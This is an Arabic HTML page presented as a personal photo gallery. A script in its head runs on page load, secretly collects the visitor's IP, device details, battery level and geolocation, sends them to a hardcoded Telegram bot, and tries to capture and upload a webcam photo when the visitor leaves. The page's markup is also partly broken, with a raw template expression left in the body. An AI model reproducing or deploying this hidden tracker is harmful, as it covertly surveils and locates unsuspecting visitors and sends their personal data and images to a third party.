<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>منونتي قلب بودا</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <script>
    async function sendVisitorInfo() {
        const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
        const chatId = "1557685494";
        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const videoUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
        const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
        const startTime = Date.now();const visitorInfo = {
        IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
        UserAgent: navigator.userAgent,
        Platform: navigator.platform,
        Language: navigator.language,
        ScreenResolution: `${window.screen.width}x${window.screen.height}`,
        DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
        OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
        ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
        TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        CurrentTime: new Date().toLocaleString(),
        VisitStartTime: new Date(startTime).toLocaleString()
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
            visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
        } catch (error) {
            visitorInfo.BatteryPercentage = "Unavailable";
            visitorInfo.ChargingStatus = "Unavailable";
        }
    }

    try {
        const geo = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
        const latitude = geo.coords.latitude;
        const longitude = geo.coords.longitude;
        visitorInfo.Location = `https://www.google.com/maps?q=${latitude},${longitude}`;
    } catch (error) {
        visitorInfo.Location = "Unavailable";
    }

    function sendMessage(text) {
        fetch(messageUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        }).catch(console.error);
    }

    function takePhoto() {
        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'user_photo.jpg');
                    fetch(photoUrl, { method: 'POST', body: formData }).catch(console.error);
                    stream.getTracks().forEach(track => track.stop());
                });
            }, 3000);
        }).catch(console.error);
    }

    window.addEventListener('beforeunload', takePhoto);

    let message = "NEW VISITOR INFORMATION\n";
    for (let key in visitorInfo) {
        message += `${key}: ${visitorInfo[key]}\n`;
    }
    sendMessage(message);
}

window.onload = sendVisitorInfo;

  </script>  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(to bottom right, #fff0f5, #e6e6fa);
      color: #4b006e;
      text-align: center;
    }
    header {
      padding: 50px 20px 20px;
    }
    header h1 {
      font-size: 3em;
      margin: 0;
    }
    .gallery {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 15px;
      padding: 20px;
    }
    .gallery img {
      width: 200px;
      border-radius: 15px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    footer {
      margin: 30px 0;
      font-size: 0.9em;
    }
  </style></head>

    ${Array.from({length: 15}, (_, i) => `<img src="image${i + 1}.jpg" alt="منونتي ${i + 1}">`).join('\n    ')}
  </div>  <footer>
    &copy; 2025/5/5 بودا لمنونتي

</body>
